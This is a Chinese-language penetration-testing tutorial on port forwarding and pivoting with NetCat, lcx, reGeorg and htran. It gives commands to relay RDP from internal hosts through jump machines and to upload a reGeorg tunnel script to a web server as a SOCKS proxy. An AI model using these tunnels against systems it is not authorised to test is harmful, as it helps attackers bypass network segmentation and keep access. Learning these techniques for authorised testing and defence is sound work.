***********![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)****NetCat*******  

NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接。

*   **用途**：
    

1： 侦听/传输模式

2：获取banner信息

3：传输文本信息

4：传输文件/目录

5：远程控制/木马

6：加密所有流量

7：流媒体服务器

8：远程克隆硬盘

这里我们主要介绍其**端口转发**

服务端

`cat /tmp/test | nc 127.0.0.1 22 | nc -lp 9000 > /tmp/test`

*******![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)****lcx***

lcx是一款强大的内网端口转发工具，用于将内网服务器开放的内部端口映射到本地任意端口。

*   **用法**：
    

```
[Usage of Packet Transmit:]

 lcx -<listen|tran|slave> <option> [-log logfile]

[option:]

 -listen <ConnectPort> <TransmitPort>

 -tran   <ConnectPort> <TransmitHost> <TransmitPort>

 -slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>
```

这里我们转发windows3389端口做演示

win2003服务端：

`lcx -slave 公网ip port 本地ip 3389`![](../Images/5f0bbc760d000513b9096dedf2881b23.png)

win7客户端:

`lcx -listen port port` //注意这里的端口为空闲端口![](../Images/b25285d798eae5d821c8f59acfb389ef.png)

进行连接验证:

连接win7的33389端口进行登陆![](../Images/dc6ae126eb8be671ab0ed729a2ee14df.png)

  

  

*******![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)***reGeorg**********

reGeorg利用了会话层的socks5协议，效率更高.上传一个代理脚本到服务器端，本地的程序去连接服务器上的脚本，脚本程序做代理转发端口和流量。

服务端：

*   首先我们可以看到reGeorg中的脚本分别有aspx、jsp、php，适用于各种web server
    

![](../Images/d9499b9931dd2f3d0f0c130bc423a6bb.png)

我们将脚本上传到web目录中脚本正常回显

![](../Images/ffb014ca05847be3a805babfc6605eff.png)

客户端：

下面我们使用reGeorg进行端口转发

`reGeorgSocksProxy.py -p 9999 -u http://192.168.81.128/tunnel.nosocket.php` //-p 进行代理的端口 -u 脚本地址

**********![](../Images/1ae7a491a1cd329cb30bbc7d57f1005b.png)*******htran***

端口转发工具，这里演示利用一台跳板机去连接另一台机器，高版本的htran还可以进行socks代理。本场景适用于同时在内网的两台机器一台不允许访问公网，这时候我们需要使用跳板进行端口转发进而访问。

**目标机器**

执行`htran -slave 跳板机ip 空闲port 本地ip 3389`![](../Images/ab3d7cb58abc6ec24a3631199cfce3fc.png)

**跳板机器**

执行`htran -tran 4444 公网ip 空闲端口`![](../Images/4c0947ea77195415ad86a873ac899ed2.png)

**公网机器**

执行`htran -listen 传来数据的port 转发的port`![](../Images/4798d1896e627b01448974638e6fff4f.png)

然后我们可以访问公网机器的转发端口连接目标机器的远程桌面继续进行信息收集利用

![](../Images/cf6e8fba92ed412f42d5b793233e4c67.png)
